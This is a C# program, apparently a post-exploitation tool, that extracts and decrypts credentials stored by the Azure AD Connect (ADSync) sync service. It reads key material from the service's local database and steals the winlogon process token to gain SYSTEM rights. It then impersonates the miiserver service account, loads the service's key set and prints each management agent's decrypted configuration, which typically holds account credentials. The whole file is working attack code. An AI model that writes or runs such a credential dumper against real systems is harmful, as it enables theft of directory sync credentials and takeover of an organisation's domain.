using Microsoft.DirectoryServices.MetadirectoryServices.Cryptography;
using System;
using System.Data.SqlClient;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Diagnostics;
using System.Security;
using System.Security.Principal;

namespace ADSyncDecrypt
{
    class Program
    {
        [DllImport("advapi32", SetLastError = true), SuppressUnmanagedCodeSecurityAttribute]
        static extern int OpenProcessToken(
        System.IntPtr ProcessHandle, // handle to process
        int DesiredAccess,          // desired access to process
        ref IntPtr TokenHandle     // handle to open access token
        );

        [DllImport("kernel32", SetLastError = true), SuppressUnmanagedCodeSecurityAttribute]
        static extern bool CloseHandle(IntPtr handle);
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, ref IntPtr DuplicateTokenHandle);

        public const int TOKEN_DUPLICATE = 2;
        public const int TOKEN_QUERY = 0X00000008;
        public const int TOKEN_IMPERSONATE = 0X00000004;

        static void Impersonate_Process(string process_name)
        {
            IntPtr hToken = IntPtr.Zero;
            IntPtr dupeTokenHandle = IntPtr.Zero;

            Process proc = Process.GetProcessesByName(process_name)[0];
            if (OpenProcessToken(proc.Handle, TOKEN_QUERY | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, ref hToken) != 0)
            {
                WindowsIdentity newId = new WindowsIdentity(hToken);
                Console.WriteLine(newId.Owner);
                try
                {
                    const int SecurityImpersonation = 2;
                    dupeTokenHandle = DupeToken(hToken, SecurityImpersonation);
                    if (IntPtr.Zero == dupeTokenHandle)
                    {
                        string s = String.Format("Dup failed {0}, privilege not held",
                        Marshal.GetLastWin32Error());
                        throw new Exception(s);
                    }

                    WindowsImpersonationContext impersonatedUser = newId.Impersonate();
                    IntPtr accountToken = WindowsIdentity.GetCurrent().Token;
                    Console.WriteLine("Token number is: " + accountToken.ToString());
                    Console.WriteLine("Windows ID Name is: " + WindowsIdentity.GetCurrent().Name);
                }
                finally
                {
                    CloseHandle(hToken);
                }
            }
            else
            {
                string s = String.Format("OpenProcess Failed {0}, privilege not held", Marshal.GetLastWin32Error());
                throw new Exception(s);
            }
        }
        static IntPtr DupeToken(IntPtr token, int Level)
        {
            IntPtr dupeTokenHandle = IntPtr.Zero;
            bool retVal = DuplicateToken(token, Level, ref dupeTokenHandle);
            return dupeTokenHandle;
        }

        static void Main(string[] args)
        {
            string connectionString = (args.Length == 0) ? "Data Source=(LocalDB)\\.\\ADSync2019;Initial Catalog=ADSync;Connect Timeout=30" : args[0];
            Console.WriteLine("Opening database {0}", connectionString);
            using (SqlConnection conn = new SqlConnection(connectionString))
            {
                conn.Open();
                SqlCommand command = new SqlCommand("SELECT instance_id, keyset_id, entropy FROM mms_server_configuration;", conn);
                SqlDataReader reader = command.ExecuteReader();
                reader.Read();

                uint keyset_id = (uint)reader.GetInt32(1);

                Guid instance_id = new Guid(reader[0].ToString());
                Guid entropy = new Guid(reader[2].ToString());

                reader.Close();

                command = new SqlCommand("SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;", conn);
                reader = command.ExecuteReader();

                Impersonate_Process("winlogon");  // get system in order to impersonate the adsync user.
                Impersonate_Process("miiserver"); // get the ADSync service process (miiserver.exe) token.
                KeyManager keyManager = new KeyManager();
                keyManager.LoadKeySet(entropy, instance_id, keyset_id);
                Key credKey = null;
                keyManager.GetActiveCredentialKey(ref credKey);

                while (reader.Read())
                {
                    Console.WriteLine("Configuration XML: ");
                    Console.WriteLine(reader[0].ToString());
                    string plain = null;
                    Console.WriteLine("Decrypted configuration XML: ");
                    credKey.DecryptBase64ToString(reader[1].ToString(), ref plain);
                    Console.WriteLine(plain);
                }
                reader.Close();
            }
        }
    }
}
